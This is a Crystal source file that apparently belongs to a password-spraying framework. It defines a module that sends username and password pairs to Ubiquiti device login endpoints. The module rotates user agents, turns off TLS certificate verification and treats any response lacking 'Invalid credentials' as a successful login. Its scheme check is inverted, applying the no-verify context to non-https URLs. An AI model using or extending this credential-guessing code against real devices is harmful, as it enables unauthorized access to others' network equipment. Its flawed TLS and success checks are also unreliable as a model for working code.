require "http/client"

class Ubiquiti_Device < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 

        # handle https or http
        if url.scheme != "https"
            #gotta set no verify for tls pages
            context = OpenSSL::SSL::Context::Client.new
            context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
            
            # create a http client 
            client = HTTP::Client.new(url, tls: context)
        else 
            client = HTTP::Client.new(url)                
        end
        
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "application/json, text/javascript, */*; q=0.01",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate, br",
            "Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With" =>  "XMLHttpRequest",
            "Origin" => "#{url.scheme}://#{url.host}",
            "Referer" => "#{url.scheme}://#{url.host}#{url.path}",
            "Priority" => "u=0"
        } 

        form = "username=#{username}&password=#{password}" # request form params here
        
        # here is the basic request 
        # /api/auth - POST is the basic auth endpoint for ubiquiti devices
        page = client.post(url.path, headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        # if page.status_code == 200 # if ok 
        #     spstatus.valid_credentials = true 
        # end

        # this is the base failure check for ubiquiti devices
        # needs to be updated to be slightly more robust
        if !page.body.includes? "Invalid credentials"
            spstatus.valid_credentials = true 
        end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end
end